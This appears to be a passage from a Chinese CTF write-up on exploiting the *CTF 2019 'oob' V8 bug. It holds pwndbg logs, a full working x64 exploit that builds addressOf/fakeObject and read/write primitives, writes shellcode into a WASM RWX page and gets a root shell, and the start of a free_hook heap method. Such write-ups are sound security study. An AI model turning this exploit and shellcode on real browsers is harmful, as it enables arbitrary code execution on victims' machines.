<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7ff37b27e700</span> (LWP <span class="number">2610828</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37aa7d700</span> (LWP <span class="number">2610829</span>)]</span><br><span class="line">[New Thread <span class="number">0x7ff37a27c700</span> (LWP <span class="number">2610830</span>)]</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000033dad08a2018</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a2030</span>: <span class="number">0x000033dad08a1fe1</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fe8</span>: <span class="number">0x000033dad08a1fb9</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1fc8</span>: <span class="number">0x000033dad08a1e21</span></span><br><span class="line">[*] leak from: <span class="number">0x000033dad08a1ea8</span>: <span class="number">0x00002c90fe47c000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00002c90fe47c000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样我们成功的泄露出了rwx内存页的起始地址</p>
<p>后续只要利用任意地址写write64原语我们的shellcode写入这个rwx页，然后调用wasm函数接口即可触发我们的shellcode了，具体实现如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/* /bin/sh for linux x64</span><br><span class="line"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span><br><span class="line">*/</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">var data_buf = new ArrayBuffer(24);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址</span><br><span class="line">data_view.setFloat64(0, i2f(shellcode[0]), true);</span><br><span class="line">data_view.setFloat64(8, i2f(shellcode[1]), true);</span><br><span class="line">data_view.setFloat64(16, i2f(shellcode[2]), true);</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/21/starctf2019-oob/image-20210104161032616.png" alt="image-20210104161032616"></p>
<p>最终运行结果如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/browser_study/v8/v8/v8/out/x64.release# ./d8 exp.js</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x0000388ba6d624a0</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d624b8</span>: <span class="number">0x0000388ba6d62469</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62470</span>: <span class="number">0x0000388ba6d62441</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62450</span>: <span class="number">0x0000388ba6d622a9</span></span><br><span class="line">[*] leak from: <span class="number">0x0000388ba6d62330</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] leak rwx_page_addr: <span class="number">0x00003a7d7595f000</span></span><br><span class="line">[*] write to : <span class="number">0x000008913e091668</span>: <span class="number">0x00003a7d7595f000</span></span><br><span class="line"><span class="meta"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><h4 id="x64如下"><a href="#x64如下" class="headerlink" title="x64如下"></a>x64如下</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line"><span class="comment">//msfvenom -p linux/x64/exec CMD=whoami -f num</span></span><br><span class="line"><span class="keyword">var</span> shellcode1 = [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x07</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x68</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>, <span class="number">0x6d</span>, <span class="number">0x69</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode1.length; i++) &#123;</span><br><span class="line">    data_view.setUint8(i, shellcode1[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<h4 id="x86如下"><a href="#x86如下" class="headerlink" title="x86如下"></a>x86如下</h4><p>经过个人分析，x86的exp不可构造</p>
<p>X86构造的过程中，发现在调用oob的过程中，当执行如下语句时</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure>

<p>泄露obj_array_map时发现泄露的是obj_array_map后面四个字节，内存如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;obj对象</span><br><span class="line">pwndbg&gt; job 0x294083a1</span><br><span class="line">0x294083a1: [JSArray]</span><br><span class="line"> - map: 0x4ccc17bd &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x47b48a75 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x260c0695 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x28dc00d5 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x29408395 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> ; obj参数对象</span><br><span class="line">pwndbg&gt; job 0x29408395</span><br><span class="line">0x29408395: [FixedArray]</span><br><span class="line"> - map: 0x260c045d &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x29408321 &lt;Object map = 0x4ccc55c5&gt;</span><br><span class="line">pwndbg&gt; telescope 0x29408394</span><br><span class="line">00:0000│  0x29408394 —▸ 0x260c045d ◂— 0x260c00			; obj_elements_map</span><br><span class="line">01:0004│  0x29408398 ◂— 0x2							  ; length = 1</span><br><span class="line">02:0008│  0x2940839c —▸ 0x29408321 ◂— 0x954ccc55		; obj_elements_ptr</span><br><span class="line">03:000c│  0x294083a0 —▸ 0x4ccc17bd ◂— 0x4260c00			; 要覆盖的map,也就是obj_map</span><br><span class="line">04:0010│  0x294083a4 —▸ 0x260c0695 ◂— 0x260c04			; properties</span><br><span class="line">05:0014│  0x294083a8 —▸ 0x29408395 ◂— 0x2260c04			; elements_obj</span><br><span class="line">06:0018│  0x294083ac ◂— 0x2</span><br><span class="line">07:001c│  0x294083b0 —▸ 0x260c0b29 ◂— 0x260c00</span><br></pre></td></tr></table></figure>

<p>而泄露的内存为<strong>00000000260c0695</strong>，为obj_array_map的后四个字节，而我们通过调试知道，x86里面变量所占用的存储空间也为8个字节，也就是说，我oob函数读写的时候，所操作的内存空间是8个字节，而起始位置，为<strong>0x294083a4</strong>，也就正好是越过obj_map，也就是四个字节进行读写。所以我们没有办法操作obj_array_map。</p>
<h2 id="8、传统堆利用方式exp构造"><a href="#8、传统堆利用方式exp构造" class="headerlink" title="8、传统堆利用方式exp构造"></a>8、传统堆利用方式exp构造</h2><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>步骤如下：</p>
<p>1、泄露程序本身的地址空间</p>
<p>2、计算d8基址，读取GOT表中malloc等libc函数的内存地址，然后然后计算free_hook或system或one_gadget的地址，最后将system或one_gadget写入free_hook触发hook调用即可实现命令执行</p>
<p>3、调用free（实际上调用了/bin/sh），getshell</p>
<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>可以通过以下顺序：</p>
<p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p>
<p>debug日志如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x27b381f0f8c9</span></span><br><span class="line"><span class="number">0x27b381f0f8c9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x1ff245482ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x0de30b5c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x2009df4801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x27b381f0f8b1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x1ff245482ed9</span></span><br><span class="line"><span class="number">0x1ff245482ed9</span>: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - back pointer: <span class="number">0x1ff245482e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2009df480609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #<span class="number">1</span>: <span class="number">0x25166f051f49</span> &lt;DescriptorArray[<span class="number">1</span>]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #<span class="number">1</span>: <span class="number">0x25166f051eb9</span> &lt;TransitionArray[<span class="number">4</span>]&gt;Transition array #<span class="number">1</span>:</span><br><span class="line">     <span class="number">0x0de30b5c4ba1</span> &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; <span class="number">0x1ff245482f29</span> &lt;<span class="built_in">Map</span>(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: <span class="number">0x25166f051111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - constructor: <span class="number">0x25166f050ec1</span> &lt;JSFunction <span class="built_in">Array</span> (sfi = <span class="number">0x2009df486791</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x0de30b5c02c1</span> &lt;Other heap <span class="built_in">object</span> (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x25166f050ec1</span></span><br><span class="line"><span class="number">0x25166f050ec1</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x1ff245482d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x25166f042109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x2009df483b29</span>)&gt;</span><br><span class="line"> - elements: <span 